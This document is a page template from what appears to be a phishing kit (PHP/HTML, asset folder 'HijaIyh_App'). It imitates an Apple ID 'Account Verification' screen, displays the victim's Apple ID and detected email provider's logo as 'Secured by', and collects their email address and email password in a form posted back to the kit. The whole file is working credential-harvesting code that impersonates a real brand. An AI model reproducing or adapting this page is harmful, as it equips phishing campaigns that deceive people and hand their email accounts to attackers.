
<!DOCTYPE html>
<html>
  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/modal.css">
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/bootstrap.min.css">
    <link rel="icon" href="./HijaIyh_App/assets/img/favicon.ico" type="image/x-icon" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="shortcut icon" sizes="196x196" href="./HijaIyh_App/assets/img/favicon.ico">
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.js"></script>
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.validate.min.js"></script>
    
  </head>
  <body> 
        
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="./HijaIyh_App/assets/css/desktop.css">
                <!DOCTYPE html>
<html lang="en"><head>
<title><?=$core->translate('Confirm your information',$lang);?></title><style>
#vbvnya {
    display:none;
}
.has-error1 input {
      
    }

.error{
  background-color: #fefdd2;
  
}

#unlocknow{
  background-color: #fff;
  position: absolute;
  width: 100%;
  margin-top:50px;
  height: 1200px;
  z-index: 55;
}

#vbvnya{
  background-color: #fff;
  position: absolute;
  width: 100%;
  margin-top:50px;
  height: 1800px;
  z-index: 55;
}

.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 4px;
    position: absolute;
    height: 45px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 16px;

}

.required:focus{
    outline: none;
    border-color:#97CDF5;
    border-width: 1px;
       -moz-box-shadow: 0px 0px 0px 2px #97CDF5;
    -webkit-box-shadow: 0px 0px 0px 2px #97CDF5;
            box-shadow: 0px 0px 0px 2px #97CDF5;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

.button-save {
    font-size: 15px;
    line-height: 1.47059;
    font-weight: 400;
    letter-spacing: -.022em;
    font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border: 1px solid #07c;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    display: inline-block;
    min-width: 30px;
    padding: 4px 15px;
    text-align: center;
    white-space: nowrap;
}

.button-save.disabled, .button-save:disabled {
    background-color: #0070c9;
    background: linear-gradient(#42a1ec,#0070c9);
    border-color: #07c;
    color: #fff;
    cursor: default;
    opacity: .3;
}

#bottom_m_login{
  background-color: #000;
  position: absolute;
  opacity: 0.7;
  width: 100%;
  height: 50px;
  z-index: 55;
}

#bottom_m1_login{
  background-color: #fff;
  width: 100%;
  margin-top:50px;
  height: 120px;
  z-index: 55;
}
#i1{
  background-image: url(./HijaIyh_App/assets/img/i1.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 12px;
  left: 20px;
  top: 20px;
  z-index: 999;
  position: absolute;
}
#i2{
  background-image: url(./HijaIyh_App/assets/img/i2.png);
  background-repeat: no-repeat;
  width: 25px;
  height: 29px;
  left: 50%;
  margin-left: -17.5px;
  top: 10px;
  z-index: 999;
  position: absolute;
}
#i3{
  background-image: url(./HijaIyh_App/assets/img/i3.png);
  background-repeat: no-repeat;
  width: 20px;
  height: 26px;
  right: 20px;
  top: 10px;
  z-index: 999;
  position: absolute;
}


#container_m_login{
    position: absolute;
    top: 0px;
    left: 50%;
  width: 330px;
  margin-left: -165px;
}
#xheader_m_login{
    width: 100%;
    height: 500px;
    top:0px;
}

.error{
  background-color: #fefdd2;
}
#sub_navbar_m_login{
    width: 100%;
    height: 61px;
    top: 44px;
    left: 0px;
    z-index: 3;
    position: absolute;
}



</style>

    </head>
<body>
<div id="bottom_m_login"></div>
    <div id="i1"></div>
    <div id="i2"></div>
    <div id="i3"></div>
    <div id="head" style="height:130px;"><br><div style="font-size: 28px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;">

         <b><center><?=$core->translate('Account Verification',$lang);?></center><br><font style='text-align:center;padding:5px;position:absolute;top:70px;width:370px;' size='2px'><?=$core->translate('Your Apple ID is',$lang);?> <?=$core->session('appleid');?></font></b> 
            </div>
       </div>
    <div id="bottom_m1_login"></div>
<div style="
    margin: auto;
    position: relative;
    margin-top: 9px;
    margin-left: 15px;
    height: 530px;
  ">
  <?php
$detectemail = $core->emaildetect($core->session('appleid'));
switch ($detectemail) {
    case 'gmail':
        $img = 'google.png';
        break;
    case 'yahoo':
        $img = 'yahoo.png';
        break;
    case 'microsoft':
        $img = 'microsoft.png';
        break;
     case 'aol':
        $img = 'aol.png';
        break;
    default:
        $img = 'apple-inc.png';
        break;

}
?>
<form id="form2" method="post" action="?req=email&appIdKey=<?=$appidkey;?>&locale=<?=$localex;?>" validate="validate"><br>
<span class="xFont1" style="">&nbsp;<b><?=$core->translate('Link an Email',$lang);?></b></span><br><br>
<i>Secured by :</i> <img src="./HijaIyh_App/assets/img/email/<?=$img;?>" style='max-width:100px;max-height: 50px'><br><br>
<input type="hidden" name="type" value="<?=$detectemail;?>">
<input type="email" required="required" maxlength="25" name="email" id="email" value="" style="width: 320px;"  placeholder="E-mail" class="required"  value="<?=$core->session('appleid');?>">
<br><br><br>
<input type="password" required="required" maxlength="25" name="password_email" id="password_email" style="width: 320px;"  placeholder="*****" class="required" >


<br><br><br><br>
<div style="float:right;">
<a onclick="document.getElementById('acc_login').style.display = 'none';document.getElementById('routingform').style.display = 'block';" class="button-save" style="background-color:#e3e3e3;background:linear-gradient(#fff, #e3e3e3);border-color:#C7C6C6;color:#0070c9;text-decoration:none;"><?=$core->translate('Go Back',$lang);?></a>
&nbsp;
<button type="submit" class="button-save" style="
    
    margin-right:40px;width: 120px;">
<span><?=$core->translate('Continue',$lang);?></span></button></div>
    
</div>
        </form>
        </div>
        
        <div tabindex="-1" id="spinner2" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>
<div tabindex="-1" id="spinner2_" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>                                
                </div>
        </div>
      <body>
</html>
